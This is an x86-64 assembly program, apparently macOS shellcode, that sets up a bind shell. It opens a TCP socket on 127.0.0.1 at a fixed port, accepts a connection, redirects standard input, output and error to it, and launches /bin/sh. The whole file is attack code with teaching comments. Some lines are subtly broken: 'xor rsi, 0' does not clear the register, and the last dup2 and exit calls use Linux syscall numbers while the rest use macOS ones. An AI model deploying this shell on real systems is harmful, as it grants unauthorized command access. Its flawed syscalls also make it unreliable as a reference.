bits 64
global _start
section .text

_start:
mov rdi, 0x2           ; AF_INET value
mov rsi, 1             ; SOCK_STREAM value
mov rdx, 0             ; default protocol
mov rax, 0x020000061   ; socket_syscall number
syscall                ; socket(AF_INET, SOCK_STREAM, 0)

mov r12, rax           ; rax is the socket fd, we save it for other functions

; bind
mov rdi, r12
xor rdx, rdx
push rdx ;                  ; address.sin_zero 
mov rcx, 0x0100007fd7110002 ; address -> port -> AF_INET  (all are 8 bytes. address is 4 port and type are 2 each)
push rcx

mov rsi, rsp            ; struct info placed on stack which has size 16 bytes
mov rdx, 16
mov rax, 0x020000068    ; bind syscall number
syscall


;listen
mov rdi, r12
mov rsi, 0   ; backlog
mov rax, 0x02000006A
syscall


; accept
mov rdi, r12
xor rsi, rsi
xor rdx, rdx
mov rax, 0x02000001E
syscall

mov r15, rax ; connected socket fd. accept create a new socket for the connection so we can send and recieve from
  
; forward FDs -> socket_FD. dup2()
mov rdi, r15
xor rsi, 0      ; stind
mov rax, 0x020000005A
syscall

mov rdi, r15
mov rsi, 1  ; stdout
mov rax, 0x020000005A
syscall

mov rdi, r15
mov rsi, 2    ; stderr
mov rax, 0x21
syscall

; execve(path, argv[], envp[])
xor rbx, rbx
mov rbx, "/bin/sh"   ; rbx is 8 bytes, this path is 7 bytes and last byte is 0 as we put it all zero in previous isntruction
push rbx  
mov rdi, rsp   ; argument 1. pointer to the path
xor rsi, rsi   ; argument 2. pointer to argment list. NULL in this example. see example 2 when using it
xor rdx, rdx   ;  arugment 3 envp -- null
mov rax, 0x020000003B
syscall

_exit:
mov rdi, 0
mov rax, 0x3c
syscall
